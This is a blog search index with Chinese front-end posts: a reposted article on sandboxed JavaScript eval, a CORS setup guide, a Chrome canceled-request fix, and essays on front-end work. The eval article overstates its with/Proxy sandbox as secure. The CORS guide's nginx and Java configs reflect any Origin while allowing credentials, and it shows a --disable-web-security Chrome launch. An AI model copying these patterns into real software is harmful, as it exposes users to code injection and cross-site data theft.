<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[250行实现一个简单的MVVM]]></title>
    <url>%2F2020%2F03%2F14%2FWeb%E5%89%8D%E7%AB%AF%2FWriting%20a%20JavaScript%20framework%20-%20Sandboxed%20Code%20Evaluation%2F</url>
    <content type="text"><![CDATA[转载自网络，原文链接：https://blog.risingstack.com/writing-a-javascript-framework-sandboxed-code-evaluation/ This is the third chapter of the Writing a JavaScript framework series. In this chapter, I am going to explain the different ways of evaluating code in the browser and the issues they cause. I will also introduce a method, which relies on some new or lesser known JavaScript features. The series is about an open-source client-side framework, called NX. During the series, I explain the main difficulties I had to overcome while writing the framework. If you are interested in NX please visit the home page. The series includes the following chapters: Project structuring Execution timing Sandboxed code evaluation (current chapter) Data binding introduction Data Binding with ES6 Proxies Custom elements Client-side routing The evil eval The eval() function evaluates JavaScript code represented as a string. A common solution for code evaluation is the eval() function. Code evaluated by eval() has access to closures and the global scope, which leads to a security issue called code injection and makes eval() one of the most notorious features of JavaScript. Despite being frowned upon, eval() is very useful in some situations. Most modern front-end frameworks require its functionality but don’t dare to use it because of the issue mentioned above. As a result, many alternative solutions emerged for evaluating strings in a sandbox instead of the global scope. The sandbox prevents the code from accessing secure data. Usually it is a simple JavaScript object, which replaces the global object for the evaluated code. The common wayThe most common eval() alternative is complete re-implementation - a two-step process, which consists of parsing and interpreting the passed string. First the parser creates an abstract syntax tree, then the interpreter walks the tree and interprets it as code inside a sandbox. This is a widely used solution, but it is arguably too heavy for such a simple thing. Rewriting everything from scratch instead of patching eval() introduces a lot of bug opportunities and it requires frequent modifications to follow the latest language updates as well. An alternative wayNX tries to avoid re-implementing native code. Evaluation is handled by a tiny library that uses some new or lesser known JavaScript features. This section will progressively introduce these features and use them to explain the nx-compile code evaluation library. The library has a function called compileCode(), which works like below. 1234567891011const code = compileCode('return num1 + num2')// this logs 17 to the consoleconsole.log(code(&#123;num1: 10, num2: 7&#125;))const globalNum = 12const otherCode = compileCode('return globalNum')// global scope access is prevented// this logs undefined to the consoleconsole.log(otherCode(&#123;num1: 2, num2: 3&#125;)) By the end of this article, we will implement the compileCode() function in less than 20 lines. new Function() The Function constructor creates a new Function object. In JavaScript, every function is actually a Function object. The Function constructor is an alternative to eval(). new Function(...args, &#39;funcBody&#39;) evaluates the passed &#39;funcBody&#39; string as code and returns a new function that executes that code. It differs from eval() in two major ways. It evaluates the passed code just once. Calling the returned function will run the code without re-evaluating it. It doesn’t have access to local closure variables, however, it can still access the global scope. 123function compileCode (src) &#123; return new Function(src)&#125; new Function() is a better alternative to eval() for our use case. It has superior performance and security, but global scope access still has to be prevented to make it viable. The ‘with’ keyword The with statement extends the scope chain for a statement. with is a lesser known keyword in JavaScript. It allows a semi-sandboxed execution. The code inside a with block tries to retrieve variables from the passed sandbox object first, but if it doesn’t find it there, it looks for the variable in the closure and global scope. Closure scope access is prevented by new Function() so we only have to worry about the global scope. 1234function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' return new Function('sandbox', src)&#125; with uses the in operator internally. For every variable access inside the block, it evaluates the variable in sandbox condition. If the condition is truthy, it retrieves the variable from the sandbox. Otherwise, it looks for the variable in the global scope. By fooling with to always evaluate variable in sandbox as truthy, we could prevent it from accessing the global scope. ES6 proxies The Proxy object is used to define custom behavior for fundamental operations like property lookup or assignment. An ES6 Proxy wraps an object and defines trap functions, which may intercept fundamental operations on that object. Trap functions are invoked when an operation occurs. By wrapping the sandbox object in a Proxy and defining a has trap, we can overwrite the default behavior of the in operator. 1234567891011121314function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has&#125;) return code(sandboxProxy) &#125;&#125;// this trap intercepts 'in' operations on sandboxProxyfunction has (target, key) &#123; return true&#125; The above code fools the with block. variable in sandbox will always evaluate to true because the has trap always returns true. The code inside the with block will never try to access the global object. Symbol.unscopables A symbol is a unique and immutable data type and may be used as an identifier for object properties. Symbol.unscopables is a well-known symbol. A well-known symbol is a built-in JavaScript Symbol, which represents internal language behavior. Well-known symbols can be used to add or overwrite iteration or primitive conversion behavior for example. The Symbol.unscopables well-known symbol is used to specify an object value of whose own and inherited property names are excluded from the ‘with’ environment bindings. Symbol.unscopables defines the unscopable properties of an object. Unscopable properties are never retrieved from the sandbox object in with statements, instead they are retrieved straight from the closure or global scope. Symbol.unscopables is a very rarely used feature. You can read about the reason it was introduced on this page. We can fix above issue by defining a get trap on the sandbox Proxy, which intercepts Symbol.unscopables retrieval and always returns undefined. This will fool the with block into thinking that our sandbox object has no unscopable properties. 123456789101112131415161718function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has, get&#125;) return code(sandboxProxy) &#125;&#125;function has (target, key) &#123; return true&#125;function get (target, key) &#123; if (key === Symbol.unscopables) return undefined return target[key]&#125; WeakMaps for cachingThe code is now secure, but its performance can be still upgraded, since it creates a new Proxy on every invocation of the returned function. This can be prevented by caching and using the same Proxy for every function call with the same sandbox object. A proxy belongs to a sandbox object, so we could simply add the proxy to the sandbox object as a property. However, this would expose our implementation details to the public, and it wouldn’t work in case of an immutable sandbox object frozen with Object.freeze(). Using a WeakMap is a better alternative in this case. The WeakMap object is a collection of key/value pairs in which the keys are weakly referenced. The keys must be objects, and the values can be arbitrary values. A WeakMap can be used to attach data to an object without directly extending it with properties. We can use WeakMaps to indirectly add the cached Proxies to the sandbox objects. 1234567891011121314151617181920212223const sandboxProxies = new WeakMap()function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; if (!sandboxProxies.has(sandbox)) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has, get&#125;) sandboxProxies.set(sandbox, sandboxProxy) &#125; return code(sandboxProxies.get(sandbox)) &#125;&#125;function has (target, key) &#123; return true&#125;function get (target, key) &#123; if (key === Symbol.unscopables) return undefined return target[key]&#125; This way only one Proxy will be created per sandbox object. Final notesThe above compileCode() example is a working sandboxed code evaluator in just 19 lines of code. If you would like to see the full source code of the nx-compile library, you can find it in this Github repository. Apart from explaining code evaluation, the goal of this chapter was to show how new ES6 features can be used to alter the existing ones, instead of re-inventing them. I tried to demonstrate the full power of Proxies and Symbols through the examples.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于跨域，看这一篇文章就够了]]></title>
    <url>%2F2020%2F03%2F12%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%85%B3%E4%BA%8E%E8%B7%A8%E5%9F%9F%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B0%B1%E5%A4%9F%E4%BA%86%2F</url>
    <content type="text"><![CDATA[转载自网络，如有侵权请联系删除 背景前后端分离的模式，前端应用通过跨域的方式直连后端机器。 跨域请求的类型简单请求 request method 属于 GET, HEAD, POST 三种简单类型之一。 headers 只包含以下几种 (大小写不敏感)： Cache-Control Content-Language Content-Type Expires Last-Modified Pragma 非简单请求 (preflight) 不符合以上简单请求规则的, 浏览器在发送请求前，会先向服务器发送一个 OPTIONS 请求, (称为 preflight), 只有当 preflight 收到 200/204 的回复时，才会发送真实的请求。 响应非简单请求有些后端应用可能只有 GET 和 POST 两种请求方式，是否还需要能响应 preflight 请求呢？ 答案是需要的，比如你的前端应用在多环境部署，可能需要在请求头中添加 X-Antcloud-Tenant header，或者是某些请求库，默认会添加 x-request-lib 这一请求头。因此，原来符合简单规则的请求，也有极大的可能会变成 preflight 请求。所以后端需要做的是，在收到 OPTIONS 请求时，返回 200/204 的状态码。 跨域相关的 headersRequest Headers: Access-Control-Request-Headers 浏览器自动添加，在 preflight 请求中，浏览器会加上真实请求中出现的 headers，后端可以根据该字段决定 Access-Control-Allow-Headers 的值。 Response Headers: Access-Control-Allow-Origin 允许跨域的的域名，不推荐使用通配符(*), 因为在使用通配符时，会跳过 Access-Control-Allow-Credentials 的配置，直接过滤掉请求携带的 cookie. 可能导致后端接口鉴权失败。 Access-Control-Allow-Credentials 是否允许跨域请求携带 cookie，通常情况下，用户信息和登陆状态都储存在 cookie 中。如果不携带 cookie 则无法通过后端的接口鉴权，需要设置为 true. Access-Control-Allow-Headers 允许出现的非简单请求头。 Access-Control-Allow-Methods 允许跨域的方法，如果没有特殊的安全考虑，可以针对 POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH 请求都放开，让所有符合 restful 规范的请求都能跨域。 Access-Control-Expose-Headers 非必填，如果前端需要消费非简单请求。则需通过该配置指定额外允许前端获得的 headers。部分情况下，浏览器的返回请求中出现 provisonal header，也与此配置有关。 Access-Control-Max-Age 非必填，preflight 请求的有效期。 通过 nginx 配置跨域通过上面请求头字段的解释，我们可以通过 nginx 允许后端应用跨域。在后端项目的 conf/auto-conf/t-alipay-engine.conf 文件中，可以对后端路径增加如下配置： 123456789101112131415location ^~ /api &#123; proxy_set_header Origin &apos;&apos;; add_header Access-Control-Allow-Credentials true; add_header Access-Control-Allow-Headers $http_access_control_request_headers; add_header Access-Control-Allow-Methods POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH; add_header Access-Control-Allow-Origin $http_origin; add_header Access-Control-Expose-Headers $http_access_control_request_headers; if ($request_method = &apos;OPTIONS&apos;) &#123; return 204; &#125; if ($request_method != &apos;OPTIONS&apos;)&#123; proxy_pass [填入接口代理地址]; &#125;&#125; 需要注意的是，目前 nginx 1.7.5 之前的版本，add_header 只对 2xx，3xx 的请求生效，5xx 的请求无法增加 header，仍会被浏览器跨域策略拦截，在 5xx 请求的 body 中包含的错误信息，前端无法获取到。 因此，通过这种策略配置的跨域，后端需要将错误信息（例如：参数错误、未登陆）包含在一个 200 的请求内返回。而不能通过 401、502 等 http code 返回，否则前端将无法获取接口出错时的内容。 通过 Java Filter 配置跨域 以下内容摘自 SOFA 官网，原链接 MVC 4.2.0 之前框架默认支持的方法是GET、HEAD、POST：相关代码，如果跨域方法不在这些方法列表中，可能报错，且MVC 4.2.0之前版本不支持修改CORS跨域相关配置，如果报错建议升级到4.2.2以上版本。 MVC 4.2.2 配置的Filter默认只会允许阿里域的域名访问，如果需要允许其他域名访问，可以在MERGE-INF/merge-smvc-scheme-default.xml文件中配置以下bean覆盖框架的默认bean: 12345678&lt;bean id=&quot;defaultCorsFilter&quot; class=&quot;com.alipay.sofa.web.mvc.security.filter.DefaultCorsFilter&quot;&gt; &lt;!-- 配置阿里域之外的白名单，只需要写url后缀即可 --&gt; &lt;property name=&quot;corsHostWhiteList&quot;&gt; &lt;list&gt; &lt;value&gt;baidu.com&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;/bean&gt; 不同 Java 技术栈通过 filter 配置的方式可能略有不同，以 HUANYU 为例，sofaboot 3.1.0： 12345&lt;parent&gt; &lt;groupId&gt;com.alipay.sofa&lt;/groupId&gt; &lt;artifactId&gt;sofaboot-alipay-dependencies&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt;&lt;/parent&gt; 1）引入依赖的 JAR 12345&lt;dependency&gt; &lt;groupId&gt;com.alipay.common&lt;/groupId&gt; &lt;artifactId&gt;alipay-common-security&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt;&lt;/dependency&gt; 2）在 merge-smvc-scheme-default.xml 文件中添加 12345678910111213141516171819&lt;bean id=&quot;defaultCorsFilter&quot; class=&quot;com.alipay.common.security.filter.DefaultCorsFilter&quot;&gt; &lt;property name=&quot;whiteHostList&quot;&gt; &lt;list&gt; &lt;value&gt;&lt;![CDATA[huanyu3.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu2.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu.test.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[paas.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[paas-pre.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[jz.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[jz-pre.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[mob-paas.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[mob-paas-pre.alipay.com]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;property name=&quot;customMethods&quot; value=&quot;GET,POST&quot;/&gt; &lt;property name=&quot;customHeads&quot; value=&quot;*&quot;/&gt; &lt;property name=&quot;customCredentials&quot; value=&quot;true&quot;/&gt;&lt;/bean&gt; 手动配置跨域如果上面的方法对你的技术栈不适用，同时 nginx 只能修改 200 请求的方式不能满足业务的需求，也可以通过 HttpServletResponse 手动添加上述跨域的 headers，在最终组装 http 返回结果前(如 Interceptor 中)调用，例如： 1234567891011import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class HttpErrorResponseUtil &#123; public static void setResponeCorsHeader(HttpServletRequest request, HttpServletResponse response) &#123; response.addHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); response.addHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH&quot;); response.addHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); response.addHeader(&quot;Access-Control-Allow-Headers&quot;, request.getHeader(&quot;Access-Control-Request-Headers&quot;)); &#125;&#125; FAQ 如果明知会跨域，有没有办法禁用本地的安全策略，方便开发和调试？ 1open -n -a /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --user-data-dir=&quot;/tmp/chrome_dev_test&quot; --disable-web-security 可以通过以上命令启动一个不安全的 chrome(Mac OS), 在本地开发时非常有用，此模式下所有请求都不会被跨域策略拦截，且不会出现 provisional header. 跨域请求是否可以发起 redirect？ 浏览器允许跨域的简单请求进行重定向，但是考虑到浏览器兼容性，不推荐进行多次的重定向。对于 preflight 请求，redirect 的地址不会被 follow.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chrome request canceled 问题排查]]></title>
    <url>%2F2020%2F03%2F11%2FWeb%E5%89%8D%E7%AB%AF%2Fchrome%20request%20canceled%20%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[背景最近在日常业务需求中，偶遇一个 resource 加载 status=canceled 的问题。 需求大致内容是在页面上增加一段唤端脚本，监听页面点击事件，进行拉端。 123document.body.addEventListener(&apos;click&apos;, () =&gt; &#123; schemaJump(schemaUrl);&#125;); 而在未安装 App 的手机浏览器 、PC 浏览器环境下，是无法拉起 App 的： 此时恰好底部的推品列表中 offer 也是通过监听点击事件进行跳转的，结果发现加入以上唤端脚本后 offer 无法点击跳转了，Chrome Developer Tools 发现点击跳转的 request 的 status=canceled，也就是被 chrome cancele 掉了。 原因排查在 stackoverflow 上找到以下几种情况 Chrome 会产生 cancel request: The DOM element that caused the request to be made got deleted (i.e. an IMG is being loaded, but before the load happened, you deleted the IMG node) You did something that made loading the data unnecessary. (i.e. you started loading a iframe, then changed the src or overwrite the contents) There are lots of requests going to the same server, and a network problem on earlier requests showed that subsequent requests weren’t going to work (DNS lookup error, earlier (same) request resulted e.g. HTTP 400 error code, etc) The event successfully sends the request, but is is canceled then (but processed by the server). The reason is, the elements submit forms on click events, no matter if you make any ajax requests on the same click event. 很显然我们的情况和第 4 条基本吻合，问题出在 click 事情监听上，解决方案： 1234document.body.addEventListener(&apos;click&apos;, (event) =&gt; &#123; event.preventDefault(); schemaJump(schemaUrl);&#125;); FAQWhat does status=canceled for a resource mean in Chrome Developer Tools?]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈：前端如何赋能业务]]></title>
    <url>%2F2020%2F02%2F26%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B5%85%E8%B0%88%EF%BC%9A%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95%E8%B5%8B%E8%83%BD%E4%B8%9A%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/62722892 你是否头疼于，每天做不完的需求和改不完的bug？ 你是否发愁，每天撸业务代码，是否能获得技术成长？ 而追求成就感的你是否想过，你所编写的一行行代码，是在反复的变化中迅速成为遗留代码，还是助公司插上腾飞的翅膀，在你死我活的战场上脱颖而出？ 因此本文会将业务和前端关联起来讨论，探讨业务发展的不同时期，前端所能做的一些事情，既能解业务的困扰，也让前端同学们摆脱码工、切图仔的定位。 千言万语不如一张图，全文完。 大误，还是得详细说说。 一、初始阶段在业务的初始阶段，在市场定位、用户诉求、产品逻辑已经明确的前提下，此时业务的核心诉求是 『尽快上线』，进行快速验证和产品迭代，当然，质量还得能过得去。 所以此时技术同学的方案侧重点是： 快、爽先说『快』，在这种情况下，什么vue/react都见鬼去，老夫只用jQuery一把梭！ 这是反面案例，这样就只能重构火葬场了，项目上线完就打包行李滚蛋…… 此时的快，指的是 尽可能复用集团/业内成熟的方案、架构，按捺住自己重新造轮子的躁动不安的心情。 这又涉及到一个问题：如何选择一个靠谱的方案？这是一个可以另开文章的话题，但先在此简单说说 根据我个人的经验，主要从稳定性、可扩展性、性能去考虑。 稳定性 如何去评估？如果一个项目能做到这几项，我是比较放心的。 项目star数多 有单测，代码覆盖率90%~95%以上 文档完备，有常见Q&amp;A issue有较快的处理流程和周期，3天内响应、1~4周内关闭。 有稳定的版本控制，不进行不兼容的升级，非要不兼容升级的话，将迁移工具做到极致。 可扩展性 如何评估？主要是指能否根据业务or已有技术方案，自定义部分内容。 例如组件库，是否能自定义主题、组件的事件回调等，因为有的需求，组件除了完成默认的行为，还需要执行其他逻辑如埋点； 例如单测工具，能否配置白名单，因为有一些代码是兼容特殊场景，编写用例模拟场景的成本实在比较高。这个主要是根据技术诉求和经验进行判断。 性能问题，短期容易被人忽视，因为能跑就行，但一旦埋下隐患，日后有坑就极难解决。容易出现性能问题的地方有：代码构建、长列表/表格滚动、大数据图表、复杂动画、3D全景渲染等，如果所做的业务涉及到这几个方面，选择方案的时候就要特别注意性能。 如果实在图省事儿，create-react-app、umi开箱即用来一套就完事儿了。 『爽』 这个字我的理解是，一款新产品出现，一定需要在用户体验or交互上有绝对领先对手的地方。 一个我始终记忆犹新的例子，就是乔布斯发布第一款iPhone时，演示滑动列表时全场的惊呼，一个乔布斯的哥们说：当你滑动页面的时候我就湿了。 另一个前端领域的例子，就是Ant Design。AntD被广泛使用，很大一部分原因是其出色的视觉设计和动效。至今为止，AntD的官网介绍上仍然说这是一个设计体系。 所以我觉得，一款新产品，除了提供刚需价值，最好在美观和易用上领先对手一大步，虽然主要还是看设计师和产品的功底，但前端同学的实现上至少不能拖后腿，不能加载太慢、滚动太卡。 蓝海市场、刚需产品也许不那么看重这一点，但有的蓝海门槛较低，很快就会转变为红海。 还值得一提的是，账户体系的建设，包括打通三方登录、免登等（客户端登录态透传到h5），网上不少资料，我实在没这方面经验，就不在此多嘴了。 二、快速扩张OK，假设产品如期上线，数据蹭蹭上涨，看起来一切都很完美。 然后问题就来了，业务开始扩张，公司新招了100个运营和10个PD，你会发现需求突然就翻了10倍。这个时候我们怎么办？ 答案只有一个：提（jia）效（ren）。所以这个时期的核心是： 快、稳提效最简单的办法是加人，但问题是，让需求翻100倍容易，但是让能接需求的人翻100倍很困难。尤其是能写出靠谱代码的前端不好找，有的时候改别人的代码，比重写一遍更麻烦。看过《人月神话》的同学都知道，加人带来的效率提升是有瓶颈的，人平均效率会随着人数增加而下降。 此时就需要考虑通过技术手段提效，沉淀基础研发体系，包括： 基础工具库+ 业务工具库，避免重复写一些简单但是容易出bug的业务逻辑。 UI规范 + 组件体系。UI规范很重要，如果设计师不能达成一致，那出来的视觉稿必然是千差万别的，你的公共组件也就难以沉淀了。 研发工具升级。主要有 构建性能优化、数据mock工具、环境切换工具、线上问题排查工具等。 除了技术手段，人员的技术成长也很重要，毕竟技术方案是由人来执行的，个人觉得常用的方式有： CodeReview，帮助新人快速成长到一定水平，保证新人开发代码的可维护性。 内部分享。分享好用工具以提升研发效率，分享底层原理避免踩更深的坑浪费大量时间，也可以分享一些编码、调试小技巧。 当然，还有一个提效的神技，就是——砍需求。 砍需求也是一门技术活儿，有的高级工程师用嘴就将需求解了。但不是每个团队都采用放权式管理（此处感谢我的历任老板们），给你足够的权力自己砍需求和排期； 有的公司采用的是集权式管理，只有前端leader能够砍需求和进行任务分配，也使得不少同学这方面能力没成长起来。 那么需求到底怎么砍？听我简单说一下，欢迎更好的套路。 首先，端正心态。 你砍需求不是为了自己偷懒要早下班，你砍需求是为了业务整体效率的提升。你要砍的是无效需求、重复需求，公司业务的核心需求不能砍。不然你把公司业务都砍死了，自己喝西北风去？公司如果运气好IPO了，你不也爽一波？ 其次，先问问需求解决的业务问题是什么？ 搞清楚这一点，就能判断：这个需求的优先级多高、是不是伪/重复需求、是否有其他方式替代解决。此处的伪需求，是指不能实际解决用户问题的需求。 再其次，数据说话。 相关的数据是怎么样的？如何推导出业务的问题所在？做完这个需求数据会变成什么样？ 最后，这个需求可能需要哪些上下游合作。涉及其他环节的需求，一定要将上下游拉到一起，考虑到所有可能的问题，统一一个方案，才能客观评估工作量。 最后的最后，也是最重要的，将共性的需求沉淀，构建组件体系or业务模块体系。有这个沉淀，才能更进一步，对需求做收敛，例如总不能说，已经有一个slider模块了，你还要再做一个类似的吧，对业务的提升到底在哪？ 一般一个重要的、合理的需求都能比较好回答上面这些的问题。其中第三点，数据说话，也对公司的数据化能力提出了要求。 最基本的pv/uv、uv点击率、停留时长，这是和前端页面相关的指标。 模块热度、功能使用情况，这是用来和业务方撕逼的时候使用的。（上次做的功能你们又不用！） 还有业务指标，例如电商的gmv、售罄率，但这些和前端没直接关系。 高级一点可以玩GrowthHack，全链路监控细分用户群的使用情况，比较适合业务已经增长到一定体量，精细化运营的场景。 大数据分析+洞察+数据可视化。会在第三部分讲述。 另一个不能忽视的是，如何变得更『稳』，因为大家都很急，一急就容易出线上故障，然后时间都花在处理故障上了，然后时间就更急，一个快速腐化的死循环，然后你能怎么办呢？只能以猝死明志啊……常见的有以下几种方法： 研发流程管控。不经测试不允许上线，这也是阿里的研发红线，看起来是效率降低的，但其实只是把处理线上问题的时间用来测试了而已。 基础库、基础组件 上单元测试，代码覆盖率90%+ 监控。线上404、页面白屏、js/接口报错等。 安全。最基本的xss、csrf做一下，再整体升一下https 问题复盘、沉淀机制。避免再出同样的问题。 以上这些问题解决了，前端同学也就算是又快又稳地帮业务度过了快速发展期，迎来业务的精耕细作期。 三、精耕细作俗话说得好：攻城容易守成难，但现在攻城也不那么容易了。现在新兴的独角兽，背后都有AT的影子，例如ofo和摩拜，双方都极难一下子摁死对方。而是互拼内力，最后很可能落得两败俱伤。这个时候我们就需要稳中求快。 前两个阶段的C端场景看起来和前端关系更加紧密，那么这个阶段和前端有什么关系呢？我觉得能做的事情有： 中后台系统的构建。 将运营们的工作线上化，同时减少部分手工操作，达到效率的提升。 虽然说运营们通常excel用得虎虎生风，但有容易出错、贪腐较多的问题，想想ofo被曝贪腐严重的新闻。 在不少缺前端的公司，这部分通常也由后端用jQuery一把梭。但后端撸出来系统，通常都欠缺交互意识（无导航、报错信息等设计）、撸不出稍微复杂的布局（见过被float和flex难住的）、缺少动效、SPA 等，做出来的系统真的差不少，都9012年了，还是让专人来干这活吧。记得加上水印，包括明水印和暗水印，便于公司时候追责，间接防止公司机密外泄。 大数据可视化。 不仅仅是消费者端页面的访问数据，还有更深层次的公司运营数据。例如ofo可以实时跟踪自行车的损坏率、监控车辆密集程度等，从而指挥调度车的调度，达到车辆投放和使用率的最佳匹配。虽然这事儿吧，核心还是数据同学产出数据的准确性，但前端同学的配合是不可或缺的。 常见的可以用来做这事儿的有Echarts、HighCharts、G2等等，虽然我们基本不可能再重复自研一套，但取其精华，快速赋能业务，就是业务前端的价值所在。 平台化。 此处其实指的是大中台、小前台的概念。因为我们往往已经积累了一批中后台系统，但如何使同一个系统更快支撑新的业务、砍掉/合并重复功能的中后台系统，也是辅助业务的一种手段。 ABTest。 根据之前的经验，电商不同行业的不同人群，对于交互设计的偏好真的就不一样，有的喜欢大图，有的喜欢小图。因此通过ABTest方案，对人群进行千人千面的细分展现，对业务也是可以稍微有一定的提升。 容器技术（hybrid &amp; 内核）&amp; 极致性能。 其实也就这么提一下，因为对于大多数公司，真没有深入追求浏览器内核提升的价值和可能性。 hybrid方案是有必要的，但应该在急剧扩张时期就做得差不多了。 极致性能也属于比较炫技的东西了（已经做到1~2s页面可交互的前提下），短期内没有特别大的必要，但在追求极致性能的过程中，迫使相关同学深入了解容器技术、服务端、网关、cdn等底层，并推动相关方升级，经过长时间的积累，带来人力储备和技术储备的提升。 四、新赛道、新增量时期基本上做完上面那些东西，公司的业务进入一个稳定的时期，就是到处看看有什么新的东西可以做了。（当然还是可能有各种各样蛋碎的改版） 核心 端的扩展： 包括各类小程序。 名义上是便于管控第三方，提供更好的体验，其实就是人为割裂出一个端，同时用流量把这个端喂起来。不过没办法，谁让爸爸们有流量呢。但注意一点，扩展一个端是有维护成本的，且并不会直接带来流量收益，需要配套的运营计划。 3D、全景、VR / AR 。有可能带来交互根本变化的东西，唯一的缺点是科技还不够先进，做全景素材成本很高，VR/AR的应用场景也不够多。 Flutter。 智能化： 业务的智能化。例如活动界面的千人千面，根据算法计算出最佳界面元素组合方式等。 研发的智能化。例如FB的Aroma、之前业内的psd2html，但这个算法和普通的电商推荐算法相比，最大的区别在于容错率极低，你推荐错了一个商品大不了不买看下一个，但你自动生成错了一句代码，整个系统就跑不起来。 实在不知道前端还有什么新的东西好关注的了，硬掰不出来，就这样吧，欢迎指点。 五、最后读完本文，相信你已经找到了前面三个问题的答案，能够不再被一堆需求推着走，也能够不再只撸业务代码，孕育出属于你们团队的技术方案而获得技术上的提升，最重要的是找到自己的一身本领在这个商业世界中的价值，不忘极客梦，技术改变世界，Rock the World。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开好一场会，比写1000行代码更重要]]></title>
    <url>%2F2020%2F02%2F26%2F%E5%85%B6%E4%BB%96%2F%E5%BC%80%E5%A5%BD%E4%B8%80%E5%9C%BA%E4%BC%9A%EF%BC%8C%E6%AF%94%E5%86%991000%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%9B%B4%E9%87%8D%E8%A6%81%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/33370262 工程师到底需不需要了解技术方案以外的东西？**例如项目的背景、当前问题、产品方案、运营策略等。 首先，我们要分情况看待： 对于偏底层的工程师，如网络、运维、中间件等，可能的确更加注重技术指标，对于上层的业务到底是怎样的，不关心也没关系。 而另一些工程师则更贴近业务，主要从事于业务相关的应用开发。对于这部分同学而言，我认为：理解业务是一件非常重要的事情。 开好一场重要的会，比写一千行代码都重要。为什么理解业务是一件很重要的事情？听我慢慢道来 一、理解业务，能帮助你确保做出来的事情是有价值的。首先，我们要对什么是有价值的做一次对焦。我认为，不是把代码写出来就算有价值的。 可能有的朋友觉得：『我靠，老子真diao，终于把产品让我做的东西做出来了，晚上吃鸡去。』 但是，恕我直言，这些东西有什么用啊？还给后人留坑。 中后台产品和消费者端页面，上线一个月就死，后面再也没人管的项目还少见么？ 底层的工具、组件库，重复造轮子，做了没人用，只能自娱自乐，这样的情况少见么？ 这些东西没价值的逻辑很简单：一个东西有没有价值，取决于它的使用情况，而不是因为仅仅因为它存在。 所以理解业务，能够帮助你在项目初期就识别以下和项目生死有关的因素： 项目的方向是否有市场。已经红海的市场，除非资源非常多，要不还是绕开吧。 PD出的产品方案是否靠谱。别一开始产品方案考虑不周全，最后又要我来加班到死改东西。 运营策略是否靠谱。东西做出来了没有运营，最后老板说，每个人拉十个朋友来用，岂不是很尴尬。 more…… 也许还是有的哥们会说：『这些和我有毛关系啊』。当然有关系啊： 对于大公司而言，项目做死了，可能你KPI就没法写了。 对于创业公司而言，项目做死了，可能公司倒了你的饭碗就没了。 二、 理解业务，能帮你识别那些真正重要的事情。很多程序员同学会哭爹喊娘，觉得活太多加班加到吐。除了一些重要紧急的项目，其他很多时候，我们完全是可以通过分清事情的优先级来解决的。 重要又紧急的事情。搞清楚方案后就马上做。 重要不紧急的事情。放进排期里有序地做。 紧急不重要的事情。用最简单的方法做。（其实这种场景并不多，我不太能想象什么事情不重要了还很紧急） 不紧急不重要的事情。痛下砍需求的屠刀。 而如果不理解业务，我们往往无法分清楚什么事情是重要的，什么是紧急的。 只有理解业务，我们才能不被忽悠，识别出那些真正重要和紧急的事情，砍掉那些繁重而无用的活，空出更多的时间学习和思考，形成良好的正向循环。 三、 学习产品设计和运营策略，对于技术类产品也很有帮助。相信稍微有经验有追求的技术同学都遇到过这样一个问题： 辛辛苦苦做了一个东西（工具、库、组件）出来，怎么就没人用呢？ 本质上，你做的东西也是产品，只不过是技术类的产品，也需要用产品思维来考虑和解决问题： 现有同类产品的痛点是什么？这些痛点是否重要？ 